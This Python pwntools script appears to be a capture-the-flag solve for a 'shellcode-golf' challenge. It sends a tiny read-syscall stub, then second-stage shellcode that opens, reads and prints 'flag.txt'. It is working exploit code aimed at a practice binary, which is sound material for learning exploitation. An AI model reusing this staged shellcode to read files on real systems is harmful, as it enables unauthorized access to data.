#!/usr/bin/env python3
from pwn import *
from time import sleep

exe = ELF("./shellcode-golf")
binary = "./shellcode-golf"
context.binary = exe
#context.log_level = "debug"
IP, PORT = "localhost", 4444

global io
gdbscript = '''
break *0x1000a
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(binary)
else:
    io = process(binary)
    gdb.attach(io, gdbscript=gdbscript)

s = lambda a: io.send(a)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
sla = lambda a, b: io.sendlineafter(a, b)
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline(False)

shellcode = asm('''
	pop rsi
	pop rsi
	xor rax,rax
	xor rdi,rdi
	syscall
''')

#print(len(shellcode))

sl(shellcode)

shellcode += asm("""
mov rdx,0x7478742e67616c66
push 0x00
push rdx
mov rax,2 
mov rsi,4
lea rdi,[rsp]
syscall
mov rdi,rax
mov rdx,24
mov rax,0
lea rsi,[rsp+0x32]
syscall
mov rax,1
mov rdi,1
mov rdx,24
lea rsi,[rsp+0x32]
syscall
mov rax,60
syscall""")

sleep(1)

sl(shellcode)

io.interactive()